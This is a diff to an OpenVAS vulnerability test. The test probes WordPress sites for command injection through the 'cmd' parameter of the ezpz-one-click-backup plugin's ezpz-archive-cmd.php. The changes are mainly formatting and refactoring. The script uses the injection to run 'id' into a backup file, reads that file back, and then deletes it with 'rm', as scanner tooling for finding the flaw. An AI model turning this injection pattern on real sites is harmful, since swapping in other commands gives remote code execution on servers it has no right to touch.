@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_ezpz_one_click_backup_cmd_exec.nasl 11867 2018-10-12 10:48:11Z cfischer $
+# $Id: gb_wordpress_ezpz_one_click_backup_cmd_exec.nasl 14007 2019-03-06 07:08:44Z cfischer $
 #
 # WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability
 #
@@ -27,19 +27,19 @@
 
 CPE = "cpe:/a:wordpress:wordpress";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.105029");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11867 $");
+  script_version("$Revision: 14007 $");
 
   script_name("WordPress Plugin 'ezpz-one-click-backup' 'cmd' Parameter OS Code Execution Vulnerability");
 
 
   script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2014/05/01/11");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-06 08:08:44 +0100 (Wed, 06 Mar 2019) $");
   script_tag(name:"creation_date", value:"2014-05-21 11:38:56 +0200 (Wed, 21 May 2014)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -50,15 +50,21 @@ if (description)
   script_mandatory_keys("wordpress/installed");
 
   script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code
-within the context of the web server.");
+  within the context of the web server.");
+
   script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
+
   script_tag(name:"insight", value:"Input passed via the 'cmd' parameter in ezpz-archive-cmd.php
-is not properly sanitized.");
+  is not properly sanitized.");
+
   script_tag(name:"solution", value:"Remove this plugin from your WordPress installation.");
+
   script_tag(name:"solution_type", value:"Mitigation");
+
   script_tag(name:"summary", value:"The ezpz-one-click-backup plugin for WordPress is prone to remote code
-execution vulnerability because it fails to properly validate user supplied input.");
-  script_tag(name:"affected", value:"12.03.10 and some earlier versions");
+  execution vulnerability because it fails to properly validate user supplied input.");
+
+  script_tag(name:"affected", value:"12.03.10 and some earlier versions.");
 
   exit(0);
 }
@@ -67,32 +73,36 @@ include("http_func.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
+if( ! port = get_app_port( cpe:CPE ) )
+  exit( 0 );
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
-if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
-vtstring = get_vt_string( lowercase:TRUE );
+if( ! dir = get_app_location( cpe:CPE, port:port ) )
+  exit( 0 );
 
-file = vtstring + '_' + rand() + '.txt';
-url = dir + '/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=id>../backups/' + file;
+if( dir == "/" )
+  dir = "";
+
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"] + '.txt';
+vuln_url = dir + "/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=";
+url = vuln_url + 'id>../backups/' + file;
 
 req = http_get( item:url, port:port );
 buf = http_send_recv( port:port, data:req );
-
-if( buf !~ "^HTTP/1\.[01] 200" ) exit( 99 );
+if( ! buf || buf !~ "^HTTP/1\.[01] 200" )
+  exit( 99 );
 
 url = dir + '/wp-content/plugins/ezpz-one-click-backup/backups/' + file;
 req = http_get( item:url, port:port );
 buf = http_send_recv( port:port, data:req );
 
-if( buf =~ "uid=[0-9]+.*gid=[0-9]+" )
-{
-  url = dir + '/wp-content/plugins/ezpz-one-click-backup/functions/ezpz-archive-cmd.php?cmd=rm%20../backups/' + file;
+if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
+  url = vuln_url + 'rm%20../backups/' + file;
   req = http_get( item:url, port:port );
   http_send_recv( port:port, data:req, bodyonly:FALSE );
-
-  security_message( port:port );
+  report = report_vuln_url( port:port, url:vuln_url );
+  security_message( port:port, data:report );
   exit( 0 );
 }
 
 exit( 99 );
-
